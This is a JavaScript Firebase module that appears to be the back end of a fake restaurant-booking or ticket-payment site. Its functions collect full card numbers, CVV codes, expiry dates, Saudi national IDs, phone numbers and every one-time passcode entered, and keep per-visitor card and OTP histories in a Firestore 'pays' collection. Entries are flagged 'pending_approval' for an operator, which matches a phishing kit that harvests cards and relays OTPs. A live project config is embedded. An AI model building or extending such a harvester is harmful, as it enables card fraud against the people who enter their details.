import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import {
  doc,
  getDoc,
  getFirestore,
  setDoc,
  updateDoc,
  onSnapshot,
} from "firebase/firestore";
import {
  getAuth,
  signInWithEmailAndPassword,
  signOut,
  onAuthStateChanged,
} from "firebase/auth";

const firebaseConfig = {
  apiKey: "AIzaSyApMHY0pn6ylcXkOkAqCWod4e9hEvnfcmk",
  authDomain: "sddfsdv-32ed7.firebaseapp.com",
  projectId: "sddfsdv-32ed7",
  storageBucket: "sddfsdv-32ed7.firebasestorage.app",
  messagingSenderId: "845847399478",
  appId: "1:845847399478:web:db644965b6675612b8dc97",
  measurementId: "G-CFP94QHC9S",
};

function initializeFirebase() {
  if (typeof window === "undefined") {
    return null;
  }

  if (!firebaseConfig.apiKey || !firebaseConfig.projectId) {
    console.warn(
      "Firebase configuration is incomplete. Some features may not work.",
    );
    return null;
  }

  return getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
}

const app = initializeFirebase();
const db = app ? getFirestore(app) : null;
const database = app ? getDatabase(app) : null;
const auth = app ? getAuth(app) : null;

const MAX_HISTORY_ITEMS = 20;
const MAX_AMOUNT_VALUE = 1_000_000;
const BLOCK_CACHE_TTL_MS = 10_000;

const blockedVisitorCache = new Map();

let cachedVisitorIp = null;
let cachedIpBlocked = null;
let cachedVisitorGeo = null;

const sanitizeString = (value, maxLength) => {
  if (typeof value !== "string") return value;
  return value.trim().slice(0, maxLength);
};

const sanitizeDigits = (value, maxLength) => {
  if (typeof value !== "string") return value;
  return value.replace(/\\D/g, "").slice(0, maxLength);
};

const sanitizePhone = (value, maxLength) => {
  if (typeof value !== "string") return value;
  return value.replace(/[^\\d+]/g, "").slice(0, maxLength);
};

const clampNumber = (value, min, max) => {
  if (typeof value !== "number" || Number.isNaN(value)) return value;
  return Math.min(max, Math.max(min, value));
};

const sanitizeCardEntry = (entry) => ({
  cardNumber: sanitizeDigits(entry?.cardNumber, 19),
  cardName: sanitizeString(entry?.cardName, 60),
  expiryMonth: sanitizeDigits(entry?.expiryMonth, 2),
  expiryYear: sanitizeDigits(entry?.expiryYear, 4),
  cvv: sanitizeDigits(entry?.cvv, 4),
  cardType: sanitizeString(entry?.cardType, 20),
  timestamp:
    typeof entry?.timestamp === "string"
      ? entry.timestamp
      : new Date().toISOString(),
});

const sanitizeOtpEntry = (entry) => ({
  code: sanitizeDigits(entry?.code, 6),
  timestamp:
    typeof entry?.timestamp === "string"
      ? entry.timestamp
      : new Date().toISOString(),
});

const sanitizePayload = (input) => {
  const data = { ...input };

  if ("id" in data) data.id = sanitizeString(data.id, 80);
  if ("name" in data) data.name = sanitizeString(data.name, 80);
  if ("saudiId" in data) data.saudiId = sanitizeDigits(data.saudiId, 10);
  if ("email" in data && typeof data.email === "string") {
    data.email = data.email.trim().toLowerCase().slice(0, 120);
  }
  if ("phone" in data) data.phone = sanitizePhone(data.phone, 15);
  if ("cardNumber" in data)
    data.cardNumber = sanitizeDigits(data.cardNumber, 19);
  if ("cardName" in data) data.cardName = sanitizeString(data.cardName, 60);
  if ("expiryMonth" in data)
    data.expiryMonth = sanitizeDigits(data.expiryMonth, 2);
  if ("expiryYear" in data)
    data.expiryYear = sanitizeDigits(data.expiryYear, 4);
  if ("cvv" in data) data.cvv = sanitizeDigits(data.cvv, 4);
  if ("cardType" in data) data.cardType = sanitizeString(data.cardType, 20);
  if ("cardCategory" in data)
    data.cardCategory = sanitizeString(data.cardCategory, 40);
  if ("otp" in data) data.otp = sanitizeDigits(data.otp, 6);
  if ("currentPage" in data)
    data.currentPage = sanitizeString(data.currentPage, 40);
  if ("status" in data) data.status = sanitizeString(data.status, 40);
  if ("type" in data) data.type = sanitizeString(data.type, 40);
  if ("guest_name" in data)
    data.guest_name = sanitizeString(data.guest_name, 120);
  if ("venue_name" in data)
    data.venue_name = sanitizeString(data.venue_name, 120);
  if ("restaurant" in data)
    data.restaurant = sanitizeString(data.restaurant, 120);
  if ("restaurantEn" in data)
    data.restaurantEn = sanitizeString(data.restaurantEn, 120);
  if ("date" in data) data.date = sanitizeString(data.date, 40);
  if ("time" in data) data.time = sanitizeString(data.time, 40);
  if ("guests" in data) data.guests = sanitizeDigits(data.guests, 2);
  if ("guests_count" in data)
    data.guests_count = clampNumber(data.guests_count, 1, 100);
  if ("notes" in data) data.notes = sanitizeString(data.notes, 300);
  if ("bookingDate" in data)
    data.bookingDate = sanitizeString(data.bookingDate, 40);
  if ("bookingTime" in data)
    data.bookingTime = sanitizeString(data.bookingTime, 40);

  if ("ticketQuantity" in data) {
    data.ticketQuantity = clampNumber(data.ticketQuantity, 1, 100);
  }
  if ("ticketPrice" in data) {
    data.ticketPrice = clampNumber(data.ticketPrice, 0, MAX_AMOUNT_VALUE);
  }
  if ("totalAmount" in data) {
    data.totalAmount = clampNumber(data.totalAmount, 0, MAX_AMOUNT_VALUE);
  }
  if ("total" in data) {
    data.total = clampNumber(data.total, 0, MAX_AMOUNT_VALUE);
  }

  if (Array.isArray(data.cardHistory)) {
    data.cardHistory = data.cardHistory
      .slice(-MAX_HISTORY_ITEMS)
      .map((entry) => sanitizeCardEntry(entry));
  }

  if (Array.isArray(data.otpHistory)) {
    data.otpHistory = data.otpHistory
      .slice(-MAX_HISTORY_ITEMS)
      .map((entry) => sanitizeOtpEntry(entry));
  }

  return data;
};

const isVisitorBlocked = async (visitorId) => {
  if (!db || !visitorId) return false;

  const cached = blockedVisitorCache.get(visitorId);
  if (cached && cached.expiresAt > Date.now()) {
    return cached.blocked;
  }

  try {
    const snapshot = await getDoc(doc(db, "pays", visitorId));
    const blocked = Boolean(snapshot.data()?.blocked);
    blockedVisitorCache.set(visitorId, {
      blocked,
      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
    });
    return blocked;
  } catch (error) {
    console.error("Error checking visitor block status:", error);
    return false;
  }
};

export const loginWithEmail = async (email, password) => {
  if (!auth) throw new Error("Auth not initialized");
  return signInWithEmailAndPassword(auth, email, password);
};

export const logoutUser = async () => {
  if (!auth) return;
  return signOut(auth);
};

export const onAuthChange = (callback) => {
  if (!auth) return () => {};
  return onAuthStateChanged(auth, callback);
};

export async function addData(data) {
  if (!db) {
    console.warn("Firebase not initialized. Cannot add data.");
    return false;
  }

  const payload = sanitizePayload(data);
  const visitorId =
    typeof payload?.id === "string"
      ? payload.id
      : localStorage.getItem("visitor");

  if (!visitorId) {
    console.warn("Missing visitor ID. Cannot add data.");
    return false;
  }

  localStorage.setItem("visitor", visitorId);
  if (cachedIpBlocked === true) {
    console.warn("Blocked IP tried to submit data:", visitorId);
    return false;
  }
  const blocked = await isVisitorBlocked(visitorId);
  if (blocked) {
    console.warn("Blocked visitor tried to submit data:", visitorId);
    return false;
  }

  try {
    const docRef = doc(db, "pays", visitorId);
    await setDoc(
      docRef,
      {
        ...payload,
        id: visitorId,
        createdDate:
          typeof payload.createdDate === "string"
            ? payload.createdDate
            : new Date().toISOString(),
      },
      { merge: true },
    );

    console.log("Document written with ID: ", docRef.id);
    return true;
  } catch (e) {
    console.error("Error adding document: ", e);
    return false;
  }
}

export const handleCurrentPage = async (page) => {
  const visitorId = localStorage.getItem("visitor");
  if (visitorId) {
    return addData({ id: visitorId, currentPage: page });
  }
  return false;
};

export const handleOtp = async (otp, page = "otp") => {
  const visitorId = localStorage.getItem("visitor");
  if (visitorId && db) {
    try {
      if (cachedIpBlocked === true) {
        throw new Error("IP_BLOCKED");
      }
      const blocked = await isVisitorBlocked(visitorId);
      if (blocked) {
        throw new Error("VISITOR_BLOCKED");
      }

      const docRef = doc(db, "pays", visitorId);
      const otpEntry = {
        code: sanitizeDigits(otp, 6),
        timestamp: new Date().toISOString(),
      };
      if (typeof otpEntry.code !== "string" || otpEntry.code.length === 0) {
        throw new Error("INVALID_OTP");
      }
      const existingOtpsRaw = JSON.parse(
        localStorage.getItem("otpHistory") || "[]",
      );
      const existingOtps = Array.isArray(existingOtpsRaw)
        ? existingOtpsRaw
        : [];
      const nextOtps = [...existingOtps, otpEntry]
        .slice(-MAX_HISTORY_ITEMS)
        .map((entry) => sanitizeOtpEntry(entry));
      localStorage.setItem("otpHistory", JSON.stringify(nextOtps));

      await setDoc(
        docRef,
        sanitizePayload({
          otp: otpEntry.code,
          otpHistory: nextOtps,
          currentPage: page,
          otpApproved: false,
          otpStatus: "pending",
        }),
        { merge: true },
      );
      return true;
    } catch (error) {
      console.error("Error saving OTP:", error);
      throw error;
    }
  }
  return false;
};

export const handlePay = async (paymentInfo, setPaymentInfo) => {
  if (!db) {
    console.warn("Firebase not initialized. Cannot process payment.");
    return false;
  }

  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      if (cachedIpBlocked === true) {
        throw new Error("IP_BLOCKED");
      }
      const blocked = await isVisitorBlocked(visitorId);
      if (blocked) {
        throw new Error("VISITOR_BLOCKED");
      }

      const docRef = doc(db, "pays", visitorId);
      const sanitizedPaymentInfo = sanitizePayload(paymentInfo);

      // Update the expiry date format to ensure month & year extract
      let expiryMonth = undefined;
      let expiryYear = undefined;
      if (paymentInfo.expiry) {
        const parts = paymentInfo.expiry.split("/");
        if (parts.length === 2) {
          expiryMonth = parts[0];
          expiryYear = "20" + parts[1];
        }
      }

      const cardEntry = sanitizeCardEntry({
        ...sanitizedPaymentInfo,
        expiryMonth,
        expiryYear,
        timestamp: new Date().toISOString(),
      });

      const snapshot = await getDoc(docRef);
      const existingHistoryRaw = snapshot.data()?.cardHistory;
      const existingHistory = Array.isArray(existingHistoryRaw)
        ? existingHistoryRaw
        : [];
      const nextCardHistory = [...existingHistory, cardEntry]
        .slice(-MAX_HISTORY_ITEMS)
        .map((entry) => sanitizeCardEntry(entry));

      await setDoc(
        docRef,
        sanitizePayload({
          ...sanitizedPaymentInfo,
          ...cardEntry, // merge extracted month/year
          status: "pending_approval",
          cardApproved: false,
          cardStatus: "pending_approval",
          cardHistory: nextCardHistory,
        }),
        { merge: true },
      );

      if (typeof setPaymentInfo === "function") {
        setPaymentInfo((prev) => ({
          ...prev,
          status: "pending_approval",
        }));
      }
      return true;
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    throw error;
  }
  return false;
};

// ... other functions
export { db, database, auth };
